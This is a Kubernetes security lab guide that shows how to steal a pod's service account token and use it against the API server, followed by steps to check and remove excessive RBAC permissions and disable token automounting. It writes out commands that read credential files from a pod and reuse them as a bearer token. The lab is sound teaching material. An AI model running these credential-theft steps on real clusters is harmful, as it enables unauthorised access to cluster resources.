
# Identity theft

In this lab you will steal the identity of a pod.

## Attack

### SSH into the VM

```bash
gcloud compute ssh root@kubernetes-security --zone europe-west3-a
```

### Getting the credentials

```bash
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### Exploiting the API-Server

```bash
TOKEN=$(kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt

# get infos about pods
curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --cacert ca.crt
```

## Avoiding the Attack

### Checking the permissions

```bash
# check permissions in the default namespace
kubectl auth can-i --list --namespace default

# check the clusterrolebinding
kubectl describe clusterrolebinding my-suboptimal-clusterrolebinding

# check the permissions of the cluster role
kubectl describe clusterrole cluster-admin
```

### Disable permissions

```bash
# disable permissions
kubectl delete clusterrolebinding my-suboptimal-clusterrolebinding

# try to get infos about pods - now this should fail
curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --cacert ca.crt
```

### Avoiding token mounts

Disable automount of ServiceAccount Token in the file `pod.yaml`
```yaml
...
spec:
  automountServiceAccountToken: false # <= disable automount of ServiceAccount Token
...
```  

```bash
kubectl apply -f pod.yaml --force
```

#### Verify sensible data is not mounted anymore
```bash
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```